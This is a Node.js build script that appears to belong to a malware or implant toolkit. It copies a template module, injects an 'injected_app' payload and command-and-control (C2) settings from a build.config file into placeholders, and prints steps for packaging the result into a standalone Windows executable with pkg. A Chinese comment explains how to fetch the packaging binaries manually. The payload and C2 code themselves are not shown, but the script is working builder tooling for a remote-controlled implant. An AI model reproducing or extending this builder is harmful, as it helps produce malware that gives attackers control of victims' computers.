const fs = require('fs');

function copyFileWithReplacement(sourcePath, destinationPath) {
    fs.copyFileSync(sourcePath, destinationPath);
}

function replaceFile(sourcePath, destinationPath) {
    try{
        fs.unlinkSync(destinationPath);
    }catch{

    }
    copyFileWithReplacement(sourcePath, destinationPath);
}

function readFileAsObject(filePath) {
    try {
        const fileContent = fs.readFileSync(filePath, 'utf-8');
        const parsedObject = JSON.parse(fileContent);
        return parsedObject;
    } catch (error) {
        console.error('Error reading or parsing file:', error);
        return null;
    }
}

function replaceStringInFile(filePath, searchString, replacement) {
    try {
        const fileContent = fs.readFileSync(filePath, 'utf-8');
        const modifiedContent = fileContent.replace(searchString, replacement);
        
        fs.writeFileSync(filePath, modifiedContent, 'utf-8');
    } catch (error) {
        console.error('Error:', error);
    }
}


// 1. copy the model
const sourceFilePath = './lib/_inspect-model.js';
const destinationFilePath = './lib/_inspect.js';
replaceFile(sourceFilePath, destinationFilePath);

// 2. load config
const loadedObject = readFileAsObject('./build.config');

// 3. replace injected_app
replaceStringInFile('./lib/_inspect.js', '$injected_app$', JSON.stringify(loadedObject.injected_app));

// 4. replace C2 info
replaceStringInFile('./lib/_inspect.js', '$c2_info$', JSON.stringify(loadedObject.c2));

// 5. pkg to an execute program
console.log(`
1. install pkg to localhost: npm install pkg -g
2. pkg.cmd -t node14-win-x64 cli.js // for win-x64, Of course, you can specify the operating system you want to run. For more information, please refer to pkg docs
`)

/*
解决国内依赖下载缓慢:
根据程序需要执行的操作系统环境，在https://github.com/vercel/pkg-fetch/releases 选择下载
具体的，如本例需要在windows x64环境执行，那么下载node-v14.20.0-win-x64，将其拷贝到 C:\Users\用户名\.pkg-cache\v3.4下，并重命名为fetched-v14.20.0-win-x64即可
*/